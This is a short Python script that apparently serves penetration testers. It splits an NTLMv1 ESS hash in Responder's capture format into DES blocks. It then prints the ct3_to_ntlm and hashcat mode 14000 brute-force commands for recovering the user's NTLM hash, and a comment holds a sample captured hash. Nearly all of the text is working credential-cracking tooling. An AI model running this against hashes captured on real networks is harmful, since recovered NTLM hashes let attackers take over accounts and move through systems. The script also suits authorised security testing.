import hashlib,binascii
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--ess', help='NTLMv1 ESS Hash in responder format', required=True)
args = parser.parse_args()

hashsplit = args.ess.split(':')
challenge = hashsplit[5]
combined = hashsplit[4]
ct1 = combined[0:16]
ct2 = combined[16:32]
f3 = hashsplit[3]
ct3 = combined[32:48]

#Hashfield Split:
#['u4-netntlm', '', 'kNS', '338d08f8e26de93300000000000000000000000000000000', '9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41', 'cb8086049ec4736c']

print "Hashfield Split:"
print str(hashsplit) + "\n"

print "Hostname: " + hashsplit[0]
print "Username: " + hashsplit[2]
print "Challenge: " + challenge
print "Combined: " + combined
print "CT1: " + ct1
print "CT2: " + ct2
print "F3: " + f3 + "\n"

print "To Calculate final 4 characters of NTLM hash use:"
print "./ct3_to_ntlm.bin " + ct3 + " " + challenge + " " + f3 + "\n"
#./ct3_to_ntlm.bin 2e1e4bf33006ba41 cb8086049ec4736c 338d08f8e26de93300000000000000000000000000000000

print "To crack with hashcat create a file with the following contents:"
print ct1 + ":" + challenge
print ct2 + ":" + challenge + "\n"

print "To crack with hashcat:"
print "./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1"

